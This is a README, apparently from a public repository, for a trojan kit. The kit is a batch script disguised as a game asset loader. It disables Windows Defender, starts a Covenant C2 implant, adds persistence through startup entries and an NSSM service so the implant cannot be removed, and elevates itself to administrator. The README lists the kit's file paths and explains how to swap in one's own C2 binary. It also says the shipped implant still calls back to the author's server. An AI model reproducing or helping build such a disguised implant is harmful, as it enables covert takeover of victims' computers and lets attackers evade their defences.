# Covenant-C2-Binary-Persistance
This is a short script that I made. It disguises itself as an asset loader for a game (which actually does launch), but secretly fully disables Windows Defender, runs the Covenant C2 Binary exe in minimized mode, adds some stuff to startup which will then run the script all over again (but shorter) and, as a cherry on top, makes the exe file into a system file using NSSM, meaning that the exe cannot be removed no matter what. An additional feature of this script is that it makes itelf always run as administrator, so that all the commands are executed properly, all while looking like a harmless asset loader. 

The Assets folder has all of the other batch files as well as NSSM and the actual game. The Readme.txt file within the zip explains some more, so hey, enjoy my flawless code!

FILE LOCATIONS:
  Main zip: AssetLoader.bat
  The game/gamefiles: Assets\www\nssm-2.24\win32\FNFvsVoxel.exe
  Binary EXE: Assets\www\nssm-2.24\src\game.exe
  Startup File: Assets\www\icons\a.bat
  Script but shorter and faster: Assets\www\media\b.bat

IMPORTING FILES
  If you want the exe file to be directed at your Covenant Server, just replace Game.exe with a binary exe which you made from your server. If you dont know how to make one then you live under a rock, but you go to launchers and select binary from there. :|

NOTES:
  I dont suggest running the bat file as soon as you get the zip. For obvious reasons, cause this one is still linked to mine. Keep in mind the fact that if you run it neither of us degenerates will be able to remove it.
